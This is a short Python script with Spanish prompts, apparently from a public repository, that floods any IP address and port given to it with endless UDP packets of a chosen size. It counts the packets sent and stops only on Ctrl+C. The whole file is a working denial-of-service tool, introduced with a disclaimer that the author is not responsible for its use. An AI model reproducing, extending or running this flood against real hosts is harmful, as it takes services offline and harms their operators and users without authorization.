import argparse
import socket
import time
import os

from colorama import Fore

amarillo = Fore.YELLOW
rojo = Fore.RED
resetear = Fore.WHITE

version = amarillo + "v2.3" + resetear
os.system("cls")

print(Fore.RED + "El creador de este repositorio no se hace responsable del uso de este.")
print("The creator of this repository is not responsible for the use made of it." + Fore.RESET)

time.sleep(3)
os.system("cls")

print("Creado por Mario C. (" + version + ")\n")
parser = argparse.ArgumentParser(description=" ")
parser.add_argument("-i", "--ip", default=None, help="Dirección IP")
parser.add_argument("-t", "--tamano", type=int, default=1024, help="Tamaño del paquete")
parser.add_argument("-p", "--puerto", type=int, default=80, help="Puerto de destino") 

args = parser.parse_args()

if args.ip is None:
    print(Fore.GREEN + "MODO BÁSICO" + Fore.WHITE)

    while True:
        ip_destino = input("Introduce la dirección IP de destino: ")
        try:
            socket.inet_aton(ip_destino)
            break
        except socket.error:
            print("Dirección IP no válida. Por favor, introduce una IP válida.")

    mensaje = "A" * args.tamano
    inicio = time.time()
    puerto_destino = args.puerto

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        contador_paquetes = 0

        while True:
            try:
                sock.sendto(mensaje.encode(), (ip_destino, puerto_destino))
                contador_paquetes += 1
                print(
                    f"Paquete enviado a {ip_destino}:{args.puerto} | Tamaño del mensaje: {len(mensaje)} bytes. | Paquete {contador_paquetes} |"
                )
            except Exception as e:
                print(f"Error al enviar el mensaje: {str(e)}")

    except KeyboardInterrupt:
        fin = time.time()
        tiempo_transcurrido = fin - inicio
        tiempo_transcurrido_formateado = "{:.3f}".format(tiempo_transcurrido)

        print("\n")
        print(
            f"Se enviaron un total de {Fore.YELLOW}{contador_paquetes}{Fore.RESET} paquetes en {Fore.GREEN}{tiempo_transcurrido_formateado}{Fore.RESET} segundos"
        )
    finally:
        sock.close()
else:
    ip_destino = args.ip
    mensaje = "A" * args.tamano
    puerto_destino = args.puerto

    inicio = time.time()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        contador_paquetes = 0

        while True:
            try:
                sock.sendto(mensaje.encode(), (ip_destino, puerto_destino))
                contador_paquetes += 1
                print(
                    f"Paquete enviado a {ip_destino}:{args.puerto} | Tamaño del mensaje: {len(mensaje)} bytes. | Paquete {contador_paquetes} |"
                )
            except Exception as e:
                print(f"Error al enviar el mensaje: {str(e)}")

    except KeyboardInterrupt:
        pass
        fin = time.time()
        tiempo_transcurrido = fin - inicio
        tiempo_transcurrido_formateado = "{:.3f}".format(tiempo_transcurrido)
        print("\n")
        print(
            f"Se enviaron un total de {Fore.YELLOW}{contador_paquetes}{Fore.RESET} paquetes en {Fore.GREEN}{tiempo_transcurrido_formateado}{Fore.RESET} segundos"
        )
    finally:
        sock.close()
